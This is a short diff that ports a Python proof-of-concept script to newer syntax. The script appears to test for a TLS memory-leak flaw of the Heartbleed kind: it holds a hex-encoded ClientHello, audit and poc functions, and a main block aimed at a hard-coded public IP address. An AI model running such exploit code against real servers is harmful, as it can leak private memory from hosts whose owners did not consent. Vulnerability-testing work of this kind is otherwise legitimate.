@@ -9,10 +9,11 @@ import socket
 import time
 import select
 import re
+import binascii
 
 
 def h2bin(x):
-    return x.replace(' ', '').replace('\n', '').decode('hex')
+    return binascii.unhexlify(x.replace(' ', '').replace('\n', ''))
 
 hello = h2bin('''
 16 03 02 00  dc 01 00 00 d8 03 02 53
@@ -129,5 +130,5 @@ def audit(arg):
     poc(arg)
     
 if __name__ == '__main__':
-    from dummy import *
+    
     poc('http://59.64.78.184')
